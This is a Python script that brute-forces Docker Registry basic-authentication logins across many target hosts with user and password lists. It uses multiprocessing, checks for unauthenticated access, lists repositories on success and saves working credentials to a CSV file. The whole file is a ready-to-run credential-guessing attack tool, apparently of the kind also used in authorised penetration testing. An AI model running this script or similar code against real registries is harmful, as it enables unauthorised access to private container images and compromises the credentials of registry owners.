#! /usr/bin/env python3

import requests, warnings
from json import dump
from datetime import date
from base64 import b64encode
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Pool, Lock, cpu_count
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

scheme = "http"
warnings.filterwarnings('ignore')
dump_details = False
lock = Lock()
thread_count = cpu_count()

def login(target, username=None, password=None, timeout=None):
    t1 = time()
    try:
        headers = {}
        if username != None:
            basic_authorization = b64encode(f"{username}:{password}".encode()).decode()
            headers["Authorization"] = f"Basic {basic_authorization}"
        response = requests.get(f"{scheme}://{target}/v2", headers=headers, verify=False, timeout=timeout)
        authorization = True if response.status_code == 200 and response.json() == {} else False
        if dump_details:
            response = requests.get(f"{scheme}://{target}/v2/_catalog", headers=headers, verify=False, timeout=timeout)
            repositories = response.json()
            details = {"repositories": repositories}
        else:
            details = None
        t2 = time()
        return authorization, t2-t1, details
    except Exception as error:
        t2 = time()
        return (False, t2-t1, None) if "401" in str(error) and "Unauthorized" in str(error) else (error, t2-t1, None)
def loginHandler(thread_index, targets, credentials, timeout):
    successful_logins = {}
    for username, password in credentials:
        for target in targets:
            status, time_taken, details = login(target, username, password, timeout)
            if status == True:
                successful_logins[target] = [username, password, details]
                with lock:
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-d', "--details", "details", "JSON File to store details about Docker Registry (Optional)"),
                              ('-T', "--timeout", "timeout", "Timeout for Request"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
        except FileNotFoundError:
            arguments.target = arguments.target.split(',')
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.credentials:
        if not arguments.users:
            arguments.users, arguments.password = [''], ['']
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if arguments.details:
        dump_details = True
    arguments.timeout = float(arguments.timeout) if arguments.timeout else None
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    total_servers = len(arguments.target)
    display('+', f"Total Target Servers = {Back.MAGENTA}{total_servers}{Back.RESET}")
    display('+', f"Total Credentials    = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    successful_logins = {}
    pool = Pool(thread_count)
    server_divisions = [arguments.target[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
    threads = []
    display(':', f"Staring {Back.MAGENTA}{thread_count}{Back.RESET} Threads")
    for index, server_division in enumerate(server_divisions):
        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials, arguments.timeout, )))
    for thread in threads:
        successful_logins.update(thread.get())
    pool.close()
    pool.join()
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)*total_servers/(t2-t1):.2f} logins / seconds{Back.RESET}")
    if len(successful_logins) > 0:
        display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
        with open(arguments.write, 'w') as file:
            file.write(f"Server,Username,Password\n")
            file.write('\n'.join([f"{server},{username},{password}" for server, (username, password, details) in successful_logins.items()]))
        if arguments.details:
            display(':', f"Dumping Details to File {Back.MAGENTA}{arguments.details}{Back.RESET}")
            with open(arguments.details, 'w') as file:
                dump({server: details for server, (username, password, details) in successful_logins.items()}, file)